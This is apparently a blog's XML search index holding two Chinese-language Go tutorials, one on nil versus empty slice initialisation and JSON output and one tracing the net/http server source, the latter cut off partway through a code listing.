<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Golang里面slice初始化的坑</title>
    <url>/2020/coding/golang/make-slice.html</url>
    <content><![CDATA[<p>相信很多人对Golang里面的数组都不陌生，但实际上99%的场景我们使用的都是slice，原因很简单，Go里面的数组类似C数组长度是固定的，局限太多，而slice则是一个变长的数组，可以自动扩容，类似JS、PHP等弱类型语言里面的数组。</p>
<p>但实际使用slice的过程中，我们一般会遇到2种写法，下面咱们就说说这2种方式的差异和存在的坑：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s []<span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="1-make和new区别"><a href="#1-make和new区别" class="headerlink" title="1.make和new区别"></a>1.make和new区别</h2><p>首先，咱先说说make的使用，make是Go的内置函数，专门用于分配和初始化指定大小的slice、map、chan类型，它返回的是一个type。而new则不同，new返回的是一个*type,也就是一个指针类型，指向type的零值。</p>
<p>在使用make初始化slice的时候，其第二个参数是slice的长度length（必填，可为0），第三个参数是容量capacity（选填），new的话只有一个参数。</p>
<p>比如下面这些写法，前面2种大部分情况下是等价的，使用起来并没有多大区别，但是第三种new的写法就稍微有点区别，因为它的返回值是指针。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s []<span class="keyword">string</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="string">"1"</span>)</span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ss = <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">ss = <span class="built_in">append</span>(ss, <span class="string">"1"</span>)</span><br><span class="line">ss = <span class="built_in">append</span>(ss, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sss = <span class="built_in">new</span>([]<span class="keyword">string</span>)</span><br><span class="line">*sss = <span class="built_in">append</span>(*sss, <span class="string">"1"</span>)</span><br><span class="line">*sss = <span class="built_in">append</span>(*sss, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"%v\n"</span>, s)</span><br><span class="line">fmt.Printf(<span class="string">"%v\n"</span>, ss)</span><br><span class="line">fmt.Printf(<span class="string">"%v\n"</span>, sss)</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">[<span class="number">1</span> <span class="number">2</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">2</span>]</span><br><span class="line">&amp;[<span class="number">1</span> <span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<p>实际应用中，slice、map、chan必须使用make初始化，new则很少用，偶尔用于结构体的初始化，但是一般结构体我们会采用更加简单的字面量声明方式。</p>
<h2 id="2-make指定slice大小和容量"><a href="#2-make指定slice大小和容量" class="headerlink" title="2.make指定slice大小和容量"></a>2.make指定slice大小和容量</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s []<span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>上面这种初始化方式，length和capacity默认是为0</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">3</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<p>而上面这种方式，则是初始化了一个长度为3，容量为10的slice，也就是说里面已经有3个元素了，但是值是这些元素类型的零值，对于string来说就是空字符串。</p>
<p>实际应用中，如果你对接下来使用的容量有一个预计，则可以提前开辟好内存空间，避免slice后期自动扩容，毕竟扩容也有性能开销。</p>
<h2 id="3-JSON序列化"><a href="#3-JSON序列化" class="headerlink" title="3.JSON序列化"></a>3.JSON序列化</h2><p>其实这点是比较奇怪的地方，也是差异最大的地方，在拿Go写API接口的时候，我们经常需要把结果序列化成JSON返回。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s []<span class="keyword">string</span></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span> &#123;</span><br><span class="line">    s = <span class="built_in">append</span>(s, <span class="string">"1"</span>)</span><br><span class="line">    s = <span class="built_in">append</span>(s, <span class="string">"2"</span>)</span><br><span class="line">    s = <span class="built_in">append</span>(s, <span class="string">"3"</span>)</span><br><span class="line">    s = <span class="built_in">append</span>(s, <span class="string">"4"</span>)</span><br><span class="line">&#125;</span><br><span class="line">result, err := json.Marshal(s)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">"%s\n"</span>, result)</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">[<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>]</span><br></pre></td></tr></table></figure>
<p>比如上面这个例子，正常情况下是没问题，但是如果 if 的条件未成立，s则是一个空的slice，结果就不一样了，返回的是null，这个就不太好了，对于前端来说，空数组应该是<code>[]</code>而不是null，从接口规范来说，我们应该保持返回类型一致。</p>
<p>但是如果你使用make初始化则不存在这个问题：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">result, err := json.Marshal(s)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">"%s\n"</span>, result)</span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">[]</span><br></pre></td></tr></table></figure>
<p>这是为什么呢？</p>
<p><b>在Go里面，当一个变量被声明了但是没有初始化值的话，其默认值则是该类型的零值，比如string默认零值是空字符串，int默认是0，对于slice来说其零值是nil。</b>所以严格来说，<code>var s []string</code>申明的是一个nil slice，而<code>make</code>初始化的是一个空slice，它们俩是有区别的，看一下下面的代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s []<span class="keyword">string</span></span><br><span class="line">fmt.Printf(<span class="string">"%v\n"</span>, s == <span class="literal">nil</span>) <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ss = <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%v\n"</span>, ss == <span class="literal">nil</span>) <span class="comment">//false</span></span><br></pre></td></tr></table></figure>
<p>虽然说大部分情况下使用起来都没有区别，但是在json序列化的时候，nil直接就被处理成了null。。。</p>
<p>最后总结，建议大家使用make初始化slice，同时也不建议通过判断slice是否为nil去处理一些逻辑，建议更加靠谱的方式，比如slice的length。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>Slice</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang的HttpServer解析</title>
    <url>/2020/coding/golang/http-server.html</url>
    <content><![CDATA[<p>Golang之所以非常适合用于网络编程的原因之一就是其自带网络库可以非常简单快速的建立一个基于http或者tcp的服务应用，以http服务为例，只需几行代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"net/http"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(writer http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        _, _ = writer.Write([]<span class="keyword">byte</span>(<span class="string">"Hello"</span>))</span><br><span class="line">    &#125;)</span><br><span class="line">    err := http.ListenAndServe(<span class="string">":8888"</span>, <span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这几行代码就启动了一个http服务，运行在8888端口，虽然说非常简陋，也不区分GET或者POST，但是其性能缺十分高效，主要是得益于其底层使用了协程，对每一个请求都会分配一个协程去处理，并发能力强。</p>
<a id="more"></a>

<h2 id="1-ISO网络模型"><a href="#1-ISO网络模型" class="headerlink" title="1.ISO网络模型"></a>1.ISO网络模型</h2><p>说到网络，不得不说一下这个模型，http本质上是一个基于tcp协议的应用层协议，而且http是超文本传输协议，注意这里的文本是指其通信协议是文本形式（具体表现就是请求头和响应头），其传输的内容并不一定是文本，可以是任何内容，图片等二进制内容都可以。</p>
<img src="https://wangbjun.site/images/old/5f6e3e27ly1g371bhib22j20da0dn0t2.jpg" />

<p>说到tcp就不得不说下socket网络编程，上面这张图基本上描述了tcp网络通信的一个流程，这和http有什么关系呢？</p>
<p>实际上，这种图里面<code>处理请求</code>这部分则是http服务应该做的东西，tcp只负责传输控制，至于内容，其协议可能是http，也可能是ftp，甚至有可能是自定义的协议。</p>
<p>网上借张http协议报文的图看一下：</p>
<img src="/images/2020-06-07_16-30.png" />

<p>实际上，协议内容非常复杂，对于每一个字段代表的意思和应该出现的位置都有规定，有人可能说，我拿chrome F12打开控制台看到和这个不一样啊，那是因为浏览器把请求解析了一行行显示出来方便咱调试而已。</p>
<p>如果你理解了这2张图，你应该理解了一个http请求是怎么发起，怎么响应的，但是实际应用中，Go又是怎么做到解析协议并且响应结果的呢？</p>
<h2 id="2-DefaultServeMux"><a href="#2-DefaultServeMux" class="headerlink" title="2.DefaultServeMux"></a>2.DefaultServeMux</h2><p>让我们点开源码，看看这几行代码到底干了啥，首先看一下个 <code>HandlFunc()</code>，Go里面关于http server的代码都在server.go这个文件里面，总共3000多行，有点多，这里摘取部分。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ServeMux <span class="keyword">struct</span> &#123;</span><br><span class="line">	mu    sync.RWMutex</span><br><span class="line">	m     <span class="keyword">map</span>[<span class="keyword">string</span>]muxEntry</span><br><span class="line">	es    []muxEntry <span class="comment">// slice of entries sorted from longest to shortest.</span></span><br><span class="line">	hosts <span class="keyword">bool</span>       <span class="comment">// whether any patterns contain hostnames</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> muxEntry <span class="keyword">struct</span> &#123;</span><br><span class="line">	h       Handler</span><br><span class="line">	pattern <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// DefaultServeMux is the default ServeMux used by Serve.</span></span><br><span class="line"><span class="keyword">var</span> DefaultServeMux = &amp;defaultServeMux</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> defaultServeMux ServeMux</span><br><span class="line"></span><br><span class="line"><span class="comment">// HandleFunc registers the handler function for the given pattern</span></span><br><span class="line"><span class="comment">// in the DefaultServeMux.</span></span><br><span class="line"><span class="comment">// The documentation for ServeMux explains how patterns are matched.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandleFunc</span><span class="params">(pattern <span class="keyword">string</span>, handler <span class="keyword">func</span>(ResponseWriter, *Request)</span>)</span> &#123;</span><br><span class="line">	DefaultServeMux.HandleFunc(pattern, handler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HandleFunc registers the handler function for the given pattern.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mux *ServeMux)</span> <span class="title">HandleFunc</span><span class="params">(pattern <span class="keyword">string</span>, handler <span class="keyword">func</span>(ResponseWriter, *Request)</span>)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> handler == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">"http: nil handler"</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	mux.Handle(pattern, HandlerFunc(handler))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的核心是<code>ServeMux</code>这个结构体，按照注释的介绍，这个是一个http server的多路复用分发器，顾名思义，它是用来处理分发请求的，下面是它实现的一些方法：</p>
<img src="/images/2020-06-07_19-01.png" />

<p>这个结构体有4个成员属性，其中mu是一个读写互斥锁；m是一个map，其key是一个string（实际上也是路由），value是一个muxEntry；这个muxEntry则是代表了handler和pattern，其中pattern就是咱说的路由，又叫请求path。</p>
<p>HandleFunc最终调用了Handle方法，其主要目的是把路由和handler函数做一个映射关系，简单说就是注册路由：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Handle registers the handler for the given pattern.</span></span><br><span class="line"><span class="comment">// If a handler already exists for pattern, Handle panics.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mux *ServeMux)</span> <span class="title">Handle</span><span class="params">(pattern <span class="keyword">string</span>, handler Handler)</span></span> &#123;</span><br><span class="line">    mux.mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> mux.mu.Unlock()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> pattern == <span class="string">""</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"http: invalid pattern"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> handler == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"http: nil handler"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> _, exist := mux.m[pattern]; exist &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"http: multiple registrations for "</span> + pattern)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> mux.m == <span class="literal">nil</span> &#123;</span><br><span class="line">        mux.m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]muxEntry)</span><br><span class="line">    &#125;</span><br><span class="line">    e := muxEntry&#123;h: handler, pattern: pattern&#125;</span><br><span class="line">    mux.m[pattern] = e</span><br><span class="line">    <span class="keyword">if</span> pattern[<span class="built_in">len</span>(pattern)<span class="number">-1</span>] == <span class="string">'/'</span> &#123;</span><br><span class="line">        mux.es = appendSorted(mux.es, e)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> pattern[<span class="number">0</span>] != <span class="string">'/'</span> &#123;</span><br><span class="line">        mux.hosts = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意一点的是<code>ServeMux</code>里面包含一个es，它保存了一个有序的entry，是根据pattern从长到短排序，不知道有啥用。。。</p>
<p>总结，这里面的<code>DefaultServeMux</code>就是库里面自己已经初始化好的一个结构体，我们可以直接用，使用它的handle方法就可以注册路由，这时有人可能会问，那咱自己动手行不行呢？当然可以</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"net/http"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myServer = <span class="built_in">new</span>(http.ServeMux)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    myServer.HandleFunc(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(writer http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        _, _ = writer.Write([]<span class="keyword">byte</span>(<span class="string">"Hello"</span>))</span><br><span class="line">    &#125;)</span><br><span class="line">    err := http.ListenAndServe(<span class="string">":8888"</span>, myServer)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这种写法就是自己new一个ServeMux，如果我们点开<code>ListenAndServe</code>这个方法，可以看到注释非常明确的写到如果第二个参数为nil则会默认使用<code>DefaultServeMux</code>，这也就解释了为什么第一种写法这个参数是nil。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ListenAndServe listens on the TCP network address addr and then calls</span></span><br><span class="line"><span class="comment">// Serve with handler to handle requests on incoming connections.</span></span><br><span class="line"><span class="comment">// Accepted connections are configured to enable TCP keep-alives.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The handler is typically nil, in which case the DefaultServeMux is used.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ListenAndServe always returns a non-nil error.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ListenAndServe</span><span class="params">(addr <span class="keyword">string</span>, handler Handler)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    server := &amp;Server&#123;Addr: addr, Handler: handler&#125;</span><br><span class="line">    <span class="keyword">return</span> server.ListenAndServe()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-ListenAndServe"><a href="#2-ListenAndServe" class="headerlink" title="2.ListenAndServe"></a>2.ListenAndServe</h2><p>前面只是一些准备工作，真正的逻辑是在这个方法里面，首先，这个方法接受2个参数，一个是监听的地址，一个<code>Handler</code>，handler是一个interface，它只有一个方法需要实现：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// A Handler responds to an HTTP request.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ServeHTTP should write reply headers and data to the ResponseWriter</span></span><br><span class="line"><span class="comment">// and then return. Returning signals that the request is finished; it</span></span><br><span class="line"><span class="comment">// is not valid to use the ResponseWriter or read from the</span></span><br><span class="line"><span class="comment">// Request.Body after or concurrently with the completion of the</span></span><br><span class="line"><span class="comment">// ServeHTTP call.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Depending on the HTTP client software, HTTP protocol version, and</span></span><br><span class="line"><span class="comment">// any intermediaries between the client and the Go server, it may not</span></span><br><span class="line"><span class="comment">// be possible to read from the Request.Body after writing to the</span></span><br><span class="line"><span class="comment">// ResponseWriter. Cautious handlers should read the Request.Body</span></span><br><span class="line"><span class="comment">// first, and then reply.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Except for reading the body, handlers should not modify the</span></span><br><span class="line"><span class="comment">// provided Request.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If ServeHTTP panics, the server (the caller of ServeHTTP) assumes</span></span><br><span class="line"><span class="comment">// that the effect of the panic was isolated to the active request.</span></span><br><span class="line"><span class="comment">// It recovers the panic, logs a stack trace to the server error log,</span></span><br><span class="line"><span class="comment">// and either closes the network connection or sends an HTTP/2</span></span><br><span class="line"><span class="comment">// RST_STREAM, depending on the HTTP protocol. To abort a handler so</span></span><br><span class="line"><span class="comment">// the client sees an interrupted response but the server doesn't log</span></span><br><span class="line"><span class="comment">// an error, panic with the value ErrAbortHandler.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Handler <span class="keyword">interface</span> &#123;</span><br><span class="line">    ServeHTTP(ResponseWriter, *Request) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果你留意了你会发现，之前那个<code>ServeMux</code>也是实现了这个方法，所以我们可以这么用。</p>
<p>哎，这时候你有一个大胆的想法，那如果我自己定义一个结构体去实现这个方法，是不是连<code>ServeMux</code>都不用new了？你别说还真是这样</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"net/http"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> myServer <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(myServer)</span> <span class="title">ServeHTTP</span><span class="params">(writer http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    _, _ = writer.Write([]<span class="keyword">byte</span>(<span class="string">"Hello"</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    err := http.ListenAndServe(<span class="string">":8888"</span>, myServer&#123;&#125;)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是你这么写，就连基本的路由功能都没了。。。因为<code>ServeMux</code>本质上就是带了一个路由功能而已，相当于官方库实现的一个路由，虽然不够强大，但是基本够用，很多第三方框架甚至会自己实现更强大的路由功能。</p>
<p>继续看这个<code>ListenAndServe</code>源码，可以看到它初始化了一个<code>Server</code>，把地址和Handler传进去了，这个Server是最重要的一个结构体了，它里面的成员和方法特别多，这里就不列出了，直接看调用的方法。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(srv *Server)</span> <span class="title">ListenAndServe</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> srv.shuttingDown() &#123;</span><br><span class="line">        <span class="keyword">return</span> ErrServerClosed</span><br><span class="line">    &#125;</span><br><span class="line">    addr := srv.Addr</span><br><span class="line">    <span class="keyword">if</span> addr == <span class="string">""</span> &#123;</span><br><span class="line">        addr = <span class="string">":http"</span></span><br><span class="line">    &#125;</span><br><span class="line">    ln, err := net.Listen(<span class="string">"tcp"</span>, addr)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> srv.Serve(tcpKeepAliveListener&#123;ln.(*net.TCPListener)&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以看到它调用了<code>net.Listen</code>监听了端口的tcp请求，这里我就不继续往下追了，因为我认为这里面往下都是属于tcp传输层的东西，不是本文研究的重点，有兴趣的童鞋可以继续追进去看一下。</p>
<p>最终把<code>TCPListener</code>转换成一个<code>tcpKeepAliveListener</code>调用了方法Serve：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Serve accepts incoming connections on the Listener l, creating a</span></span><br><span class="line"><span class="comment">// new service goroutine for each. The service goroutines read requests and</span></span><br><span class="line"><span class="comment">// then call srv.Handler to reply to them.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// HTTP/2 support is only enabled if the Listener returns *tls.Conn</span></span><br><span class="line"><span class="comment">// connections and they were configured with "h2" in the TLS</span></span><br><span class="line"><span class="comment">// Config.NextProtos.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Serve always returns a non-nil error and closes l.</span></span><br><span class="line"><span class="comment">// After Shutdown or Close, the returned error is ErrServerClosed.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(srv *Server)</span> <span class="title">Serve</span><span class="params">(l net.Listener)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> fn := testHookServerServe; fn != <span class="literal">nil</span> &#123;</span><br><span class="line">        fn(srv, l) <span class="comment">// call hook with unwrapped listener</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    l = &amp;onceCloseListener&#123;Listener: l&#125;</span><br><span class="line">    <span class="keyword">defer</span> l.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := srv.setupHTTP2_Serve(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> !srv.trackListener(&amp;l, <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ErrServerClosed</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> srv.trackListener(&amp;l, <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> tempDelay time.Duration     <span class="comment">// how long to sleep on accept failure</span></span><br><span class="line">    baseCtx := context.Background() <span class="comment">// base is always background, per Issue 16220</span></span><br><span class="line">    ctx := context.WithValue(baseCtx, ServerContextKey, srv)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        rw, e := l.Accept()</span><br><span class="line">        <span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> &lt;-srv.getDoneChan():</span><br><span class="line">                <span class="keyword">return</span> ErrServerClosed</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ne, ok := e.(net.Error); ok &amp;&amp; ne.Temporary() &#123;</span><br><span class="line">                <span class="keyword">if</span> tempDelay == <span class="number">0</span> &#123;</span><br><span class="line">                    tempDelay = <span class="number">5</span> * time.Millisecond</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    tempDelay *= <span class="number">2</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> max := <span class="number">1</span> * time.Second; tempDelay &gt; max &#123;</span><br><span class="line">                    tempDelay = max</span><br><span class="line">                &#125;</span><br><span class="line">                srv.logf(<span class="string">"http: Accept error: %v; retrying in %v"</span>, e, tempDelay)</span><br><span class="line">                time.Sleep(tempDelay)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line">        &#125;</span><br><span class="line">        tempDelay = <span class="number">0</span></span><br><span class="line">        c := srv.newConn(rw)</span><br><span class="line">        c.setState(c.rwc, StateNew) <span class="comment">// before Serve can return</span></span><br><span class="line">        <span class="keyword">go</span> c.serve(ctx)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中比较核心的是for循环里面那一段，不断的<code>Accept</code>新的请求，然后通过<code>srv.newConn</code>创建一个新的连接，然后开启一个go协程处理这个请求。这个<code>srv.newConn</code>返回的是一个<code>conn</code>结构体，其成员和函数也非常之多，它代表的是服务的一个http连接。</p>
<p>下面这段代码是处理http请求协议内容的核心代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Serve a new connection.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *conn)</span> <span class="title">serve</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line">    c.remoteAddr = c.rwc.RemoteAddr().String()</span><br><span class="line">    ctx = context.WithValue(ctx, LocalAddrContextKey, c.rwc.LocalAddr())</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := <span class="built_in">recover</span>(); err != <span class="literal">nil</span> &amp;&amp; err != ErrAbortHandler &#123;</span><br><span class="line">            <span class="keyword">const</span> size = <span class="number">64</span> &lt;&lt; <span class="number">10</span></span><br><span class="line">            buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, size)</span><br><span class="line">            buf = buf[:runtime.Stack(buf, <span class="literal">false</span>)]</span><br><span class="line">            c.server.logf(<span class="string">"http: panic serving %v: %v\n%s"</span>, c.remoteAddr, err, buf)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> !c.hijacked() &#123;</span><br><span class="line">            c.<span class="built_in">close</span>()</span><br><span class="line">            c.setState(c.rwc, StateClosed)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tlsConn, ok := c.rwc.(*tls.Conn); ok &#123;</span><br><span class="line">        <span class="keyword">if</span> d := c.server.ReadTimeout; d != <span class="number">0</span> &#123;</span><br><span class="line">            c.rwc.SetReadDeadline(time.Now().Add(d))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> d := c.server.WriteTimeout; d != <span class="number">0</span> &#123;</span><br><span class="line">            c.rwc.SetWriteDeadline(time.Now().Add(d))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> err := tlsConn.Handshake(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="comment">// If the handshake failed due to the client not speaking</span></span><br><span class="line">            <span class="comment">// TLS, assume they're speaking plaintext HTTP and write a</span></span><br><span class="line">            <span class="comment">// 400 response on the TLS conn's underlying net.Conn.</span></span><br><span class="line">            <span class="keyword">if</span> re, ok := err.(tls.RecordHeaderError); ok &amp;&amp; re.Conn != <span class="literal">nil</span> &amp;&amp; tlsRecordHeaderLooksLikeHTTP(re.RecordHeader) &#123;</span><br><span class="line">                io.WriteString(re.Conn, <span class="string">"HTTP/1.0 400 Bad Request\r\n\r\nClient sent an HTTP request to an HTTPS server.\n"</span>)</span><br><span class="line">                re.Conn.Close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            c.server.logf(<span class="string">"http: TLS handshake error from %s: %v"</span>, c.rwc.RemoteAddr(), err)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        